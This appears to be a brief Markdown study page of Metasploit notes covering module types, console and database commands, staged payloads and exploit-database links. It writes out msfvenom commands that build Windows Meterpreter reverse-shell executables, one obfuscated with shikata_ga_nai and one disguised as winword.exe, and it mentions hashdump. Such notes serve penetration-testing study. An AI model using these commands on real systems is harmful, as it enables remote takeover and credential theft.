---
title: "Metasploit"
permalink: /docs/07_metasploit_101/
toc: true
---
#### Modules
- Exploit 
- Auxilary 
- post exploitation 
- Shell code related : payloads, NOPgenerator

- https://www.offensive-security.com/metasploit-unleashed/


#### commands
- msfconsole : to start metasploit
- msfupdate  : to update
- apt update && apt install metasploit-framework
- to start database : service PostgreSQL start
- db_status : database connectivity status
- db_import : importing file
- workspaces : to segregate work by pentester
  - workspace -d lab_network
- meterpreter
- hashdump
  
- payloads
  - staged payloads 
    - moduled as loader and final stage payload 
    - ex: windows/shell/reverse_tcp, first it send execute loader and second, attacker handler to send final payloadd
- msfvenom 
  - encoder : shikata_ga_nai
  - msfvenom -p windows/meterpreter/reverse_tcp LHOST=LOCAL_IP LPORT=LOCAL_PORT -f exe -o rev_shell.exe
  - msfvenom -p windows/meterpreter/reverse_tcp LHOST=LOCAL_IP LPORT=LOCAL_PORT -e x86/shikata_ga_nai -i 3 -f exe -o pay_load.exe
  - msfvenom -p windows/meterpreter/reverse_tcp LHOST=LOCAL_IP LPORT=LOCAL_PORT -x winword.exe -f exe -o winword.exe


- integrations : metasploit can integrate with Nessus




#### References 
- https://www.exploit-db.com
- https://www.rapid7.com/db/modules
- https://0day.today/
